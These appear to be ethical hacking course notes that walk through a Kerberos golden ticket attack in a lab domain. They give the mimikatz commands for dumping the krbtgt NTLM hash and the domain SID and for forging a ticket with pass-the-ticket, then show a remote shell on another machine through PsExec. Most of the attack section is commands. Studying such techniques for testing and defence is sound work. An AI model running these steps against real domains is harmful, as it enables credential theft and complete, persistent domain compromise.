
## **Overview**

- [ ] **What is it ?**
	- When we compromise the krbtgt account, we own the domain
	- We can request access to any resource or system on the domain
	- Golden tickets == Complete access to every machine

- [ ] We can utilize `mimikatz` to obtain the information necessary to perform this attack
- [ ] There are a couple of conditions need to be met 
	- We need the krbtgt NTLM hash
	- We also need the domain SID 
- [ ] Once we have this we can generate our golden ticket and once it is generated we can use an attack call **Pass-the-Ticket** in other to utilize this anywhere
- [ ] We can think of a **Golden Ticket** attack as **Persistence**

## **Attack Scenario**

First of all make sure you transfer `mimikatz` to your domain controller then we can start it through the **Command Prompt**

```powershell
# start mimikatz
C:\Users\Administrator\Downloads>mimikatz.exe

# Elevate to highest integrity level
mimikatz # privilege::debug
mimikatz # token::elevate
```


### **Dumping the SID and NTLM hash**

```powershell
# Dump the sid and NTLM hash of the krbtgt user
mimikatz # lsadump::lsa /inject /name:krbtgt
```


#### **Example**

![](https://i.imgur.com/4XcWt6w.png)

**Note :** Copy both the SID and NTLM hash to your note pad on your DC



### **Generating Tickets**

```powershell
# /User : fake user account
# /domain : domain controller
# /sid : the sid we saved to note pad
# /krbtgt : the NTLM hash 
# /id : administrator RID for advanced privileges
# /ptt : pass-the-ticket option

mimikatz # kerberos::golden /User:secfortress /domain:marvel.local /sid:S-1-5-21-4089637540-2738901061-2314813381 /krbtgt:f362ad348de4e7392c0309959ec0775d /id:500 /ptt
```

#### **Example**


![](https://i.imgur.com/qgE2uyK.png)


### **Executing Command remotely**
Once you have the prompt as shown i the previous example do this :

```powershell
mimikatz # misc::cmd
```

You should see a new command prompt we can execute commands as any user from here.


#### **Example**



![](https://i.imgur.com/2DBD485.png)

### **Using PsExec.exe for remote shell**


We can then further our attack and gain a shell on remote target with `PsExec.exe` 
 - Download the file from [here](https://github.com/sec-fortress/Practical-Ethical-Hacking-Notes/raw/main/PsExec.exe) and transfer it to the DC downloads folder
 - On your active command prompt run

```powershell
# PsExec.exe \\MACHINE-IP/NAME cmd.exe

C:\Users\Administrator\Downloads>PsExec.exe \\THEPUNISHER cmd.exe
```



![](https://i.imgur.com/e7eovyE.png)
